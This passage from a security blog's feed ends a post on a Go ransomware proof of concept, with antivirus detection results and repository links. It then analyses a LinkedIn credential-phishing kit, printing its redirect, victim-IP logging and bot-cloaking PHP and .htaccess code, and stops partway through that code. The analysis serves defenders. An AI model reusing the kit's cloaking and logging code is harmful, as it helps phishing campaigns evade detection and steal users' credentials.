&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/goransompowershell.png&#34;
         alt=&#34;It works in the same way in Windows 10&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;It works in the same way in Windows 10&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;detection&#34;&gt;Detection&lt;/h2&gt;
&lt;p&gt;While I was testing &lt;code&gt;goransom&lt;/code&gt; on Windows 10, I had the issue that Windows Security complained about it:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/windows_def.png&#34;
         alt=&#34;Windows Security doesn&amp;amp;rsquo;t like goransom&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Windows Security doesn&amp;rsquo;t like goransom&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;So I uploaded three different &lt;code&gt;goransom&lt;/code&gt; executables on VirusTotal, to see if they are detected. Here are the results:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/vtwin.png&#34;
         alt=&#34;goransom for Windows on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/1ea7f882ffab3e6fd7e80ae525df7bb35f53187948647bde2bb87a473e7c0107/detection&#34;&gt;goransom for Windows on VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/vtlinux.png&#34;
         alt=&#34;goransom for Linux on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/982cedf944165137afdf5ec1b6341e588c7bea2c7b84b32578ae522b6784d01b/detection&#34;&gt;goransom for Linux on VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/vtmac.png&#34;
         alt=&#34;goransom for macOs on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/17c6001d777259d10010622e722c52c36315986895dfab385db0e2f9ddc3a041/detection&#34;&gt;goransom for macOs on VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The Windows version is the only one which is considered malicious, since 43 (!!) engines flagged it. Please note that the source code which was used to compile the three executables is exactly the same. Also, one of the functions in &lt;code&gt;goransom&lt;/code&gt; is called &lt;code&gt;ransomware&lt;/code&gt;, which may be the reason why some engines flags the Windows executable.&lt;/p&gt;
&lt;p&gt;Unfortunately &lt;code&gt;goransom&lt;/code&gt; cannot be readily tested against public sandboxes, as it requires an input to be executed properly. I am not aware of online tools which allow this level of interaction with an executable, but if you know some, please let me know. It would be interesting to see the outcome.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;goransom&lt;/code&gt; was super fun and relatively easy to make. The &lt;code&gt;crypto&lt;/code&gt; package and the goroutines allow the code to be easy to read and efficient.&lt;/p&gt;
&lt;p&gt;There are a number of improvements which could be added, but, in the end, I consider the proof of concept successful as it is. And the fact that VirusTotal and Microsoft Security do not like &lt;code&gt;goransom&lt;/code&gt; makes it even more successful.&lt;/p&gt;
&lt;p&gt;You can find &lt;code&gt;goransom&lt;/code&gt; &lt;a href=&#34;https://github.com/andpalmier/goransom&#34;&gt;on my GitHub&lt;/a&gt;, let me know if you have suggestions or tips to improve the quality and structure of the code.&lt;/p&gt;
&lt;p&gt;If you are looking for other proof of concept of ransomware written in Go, check out these projects:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/target111/go-crypt&#34;&gt;go-crypt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/lucdew/goransomware&#34;&gt;goransomware&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/wille/cry&#34;&gt;go-cry&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Phishing findings, campaign #2: content.zip (LinkedIn)</title>
      <link>/posts/phishing-findings-2/</link>
      <pubDate>Wed, 08 Jul 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/phishing-findings-2/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/sampei.jpeg&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;I started hunting and reporting phishing websites on Twitter: follow me &lt;a href=&#34;https://twitter.com/andpalmier&#34;&gt;here&lt;/a&gt; if you are interested!
In this series of posts I am going to analyze and discuss some of the phishing kits found online.&lt;/p&gt;
&lt;h2 id=&#34;lets-start-from-the-beginning&#34;&gt;Let&amp;rsquo;s start from the beginning&lt;/h2&gt;
&lt;p&gt;The kit was created to steal LinkedIn credentials:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep2/content.png&#34;
         alt=&#34;How this phishing kit looks like when deployed&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;How this phishing kit looks like when deployed&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the message at the top: &lt;em&gt;&amp;ldquo;Send Your Product quotes to interested buyers via LinkedIn&amp;rdquo;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;the two input fields for the password (and the missing &lt;em&gt;&amp;lsquo;Forgot password?&#39;&lt;/em&gt; link)&lt;/li&gt;
&lt;li&gt;the message under the &lt;em&gt;Continue&lt;/em&gt; button: &lt;em&gt;&amp;ldquo;By clicking Continue you proceed to send your business catalogues and quotes&amp;rdquo;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So this page is not targeting the usual LinkedIn user: it is pretending to provide a feature to send catalogues and quotes using the social network.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s now check the zip of this kit on VirusTotal, using &lt;code&gt;sha256sum&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sha256sum content.zip
e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b  content.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep2/vtcontentzip.png&#34;
         alt=&#34;VirusTotal detections for the zip of this phishing kit&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b/detection&#34;&gt;VirusTotal detections for the zip of this phishing kit&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;explore-the-kit&#34;&gt;Explore the kit&lt;/h2&gt;
&lt;p&gt;If we extract the archive, we will see the following structure:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ tree -a content
content
├── blocker.php
├── .htaccess
├── index.php
├── Linkedin
│   ├── geoplugin.class.php
│   ├── index.php
│   └── loginss.php
├── robots.txt
└── vu.txt

&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; directory, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This kit is simpler than the one analyzed in &lt;a href=&#34;https://andpalmier.github.io/posts/phishing-findings-1/&#34;&gt;the previous post&lt;/a&gt;, and it contains only the LinkedIn template. The presence of a &lt;em&gt;txt&lt;/em&gt; file (&lt;code&gt;vu.txt&lt;/code&gt;) usually indicates that the kit is logging information about victims or visitors. It is also interesting to note that a &lt;code&gt;.htaccess&lt;/code&gt; and &lt;code&gt;robots.txt&lt;/code&gt; files are shipped with the kit itself.&lt;/p&gt;
&lt;h2 id=&#34;entry-point&#34;&gt;Entry point&lt;/h2&gt;
&lt;p&gt;So we can start our analysis from the entry point (&lt;code&gt;index.php&lt;/code&gt;), here are the first lines:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
$emai &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blocker.php&amp;#39;&lt;/span&gt;);
$DIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100000000000&lt;/span&gt;));
&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;recurse_copy&lt;/span&gt;($home,$DIR) {
    $dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;opendir&lt;/span&gt;($home);
    &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mkdir&lt;/span&gt;($DIR);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; ( $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readdir&lt;/span&gt;($dir)) ) {
	    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (( $file &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; ) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ( $file &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;..&amp;#39;&lt;/span&gt; )) {
		    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;is_dir&lt;/span&gt;($home &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file) ) {
			    &lt;span style=&#34;color:#a6e22e&#34;&gt;recurse_copy&lt;/span&gt;($home &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file,$DIR &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file);
		    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
			    &lt;span style=&#34;color:#a6e22e&#34;&gt;copy&lt;/span&gt;($home &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file,$DIR &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file);
		    }
	    }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;closedir&lt;/span&gt;($dir);
}
$home&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Linkedin&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;recurse_copy&lt;/span&gt;( $home, $DIR );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will take a look at &lt;code&gt;blocker.php&lt;/code&gt; in the next paragraph, for now, let&amp;rsquo;s just say that it is included, and let&amp;rsquo;s focus on the following lines.
A new directory is created using &lt;code&gt;@mkdir&lt;/code&gt;, and it has a name obtained from the &lt;em&gt;md5&lt;/em&gt; hash of a random number: this means that a new folder will be created every time &lt;code&gt;index.php&lt;/code&gt; is reached. The files included in the &lt;em&gt;&amp;lsquo;Linkedin&amp;rsquo;&lt;/em&gt; folder are then copied in this newly created folder using the &lt;code&gt;recurse_copy&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s continue with the definition of a header:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$DIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?user=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$emai&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;.verify?service=mail&amp;amp;data:text/html;charset=utf-8;base64,
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some parameters are specified for a redirection: &lt;em&gt;location&lt;/em&gt; is equal to the newly created folder, &lt;em&gt;user&lt;/em&gt; equal to &lt;code&gt;$_GET[&#39;user&#39;]&lt;/code&gt; (it will be used to automatically fill the email address in the fake LinkedIn form) and &lt;em&gt;service&lt;/em&gt; is set to &lt;em&gt;mail&lt;/em&gt;. This header also includes a base64 string which can easily be decoded:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&amp;#39;&lt;/span&gt; | base64 -d
&amp;lt;html&amp;gt;
&amp;lt;style&amp;gt; body &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; margin: 0; overflow: hidden; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &amp;lt;/style&amp;gt;
  &amp;lt;ifram%
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To be honest, I didn&amp;rsquo;t really get the point of encoding some HTML code in base64 and place it in the header, ping me if you have any idea.&lt;/p&gt;
&lt;p&gt;Anyway, here is the rest of &lt;code&gt;index.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
$ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getenv&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span&gt;);
$file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vu.txt&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;fwrite&lt;/span&gt;($file,$ip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;gmdate&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Y-n-d&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; @ &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;gmdate&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;H:i:s&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where the IP address of the victim is appended to &lt;code&gt;vu.txt&lt;/code&gt; with a timestamp. As we saw while checking the structure of the kit, &lt;code&gt;vu.txt&lt;/code&gt; is not created while executing these lines. If we check the content of the file before running &lt;code&gt;index.php&lt;/code&gt;, it contains:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;127.0.0.1  -  2017-8-14 @ 20:49:14
127.0.0.1  -  2017-8-14 @ 20:49:48
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These information were probably left by the developer of the kit; and gives us an idea about when the kit was created/released.&lt;/p&gt;
&lt;h2 id=&#34;hiding-techniques&#34;&gt;Hiding techniques&lt;/h2&gt;
&lt;p&gt;Many phishing kits try to hide themselves from bots or web sandbox. In this case, the kit uses 3 techniques:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;robots.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.htaccess&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blocker.php&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;robotstxt&#34;&gt;robots.txt&lt;/h3&gt;
&lt;p&gt;This file is used by web developers to give information to web crawlers about the structure of the site. In this case:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;User-agent: *
Disallow: /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;specifies that every crawler (no matter the User-Agent string) should not navigate in the site. This is commonly used to avoid being indexed by search engines.&lt;/p&gt;
&lt;h3 id=&#34;htaccess&#34;&gt;.htaccess&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;.htaccess&lt;/code&gt; is a configuration file for Apache Web servers. It can be used to alter the settings, configurations and functionalities of Apache Web servers. In the case of this kit, the file is used to deny access to specific subnets and bots.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;.htaccess&lt;/code&gt; provided in the kit can be dived in two main parts. The first one uses &lt;code&gt;deny from&lt;/code&gt; with a long list of subnets and domain names (almost 6000). Here are some lines:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;[..]
deny from 66.235.132.121/22
deny from 66.235.133.14/22
[...]
deny from google.com
deny from paypal.com
[..]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Blocked visitors will be shown the error message &lt;em&gt;403 Forbidden&lt;/em&gt;. At the end of this part of the file, &lt;code&gt;allow from all&lt;/code&gt; is used to allow access to all the other subnets.&lt;/p&gt;
&lt;p&gt;The second part is used to block bots, and it uses the following syntax:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;[..]
RewriteCond %{HTTP_USER_AGENT} ^HMView [OR]
RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR]
RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR]
[..]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This part of the file embedded is pasted from an example provided in a &lt;a href=&#34;http://www.htaccess-guide.com/blocking-offline-browsers-and-bad-bots/&#34;&gt;tutorial called &lt;em&gt;Blocking offline browsers and &amp;lsquo;bad bots&amp;rsquo;&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;blockerphp&#34;&gt;blocker.php&lt;/h3&gt;
&lt;p&gt;Similarly to the previous files, &lt;code&gt;blocker.php&lt;/code&gt; is used to prevent some hosts to access the site. It is included in the entry point of the kit and it contains:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
$hostname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gethostbyaddr&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]);
$blocked_words &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;above&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;google&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;softlayer&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;amazonaws&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cyveillance&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phishtank&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dreamhost&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;netpilot&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calyxinstitute&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tor-exit&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;paypal&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt;($blocked_words &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; $word) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;substr_count&lt;/span&gt;($hostname, $word) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1.0 404 Not Found&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;h1&amp;gt;404 Not Found&amp;lt;/h1&amp;gt;The page that you have requested could not be found.&amp;#34;&lt;/span&gt;);

    }
}
$bannedIP &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^66.102.*.*&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^38.100.*.*&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^107.170.*.*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;in_array&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;],$bannedIP)) {
     &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP/1.0 404 Not Found&amp;#39;&lt;/span&gt;);
     &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
     &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt;($bannedIP &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; $ip) {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $ip &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;,$_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;])){
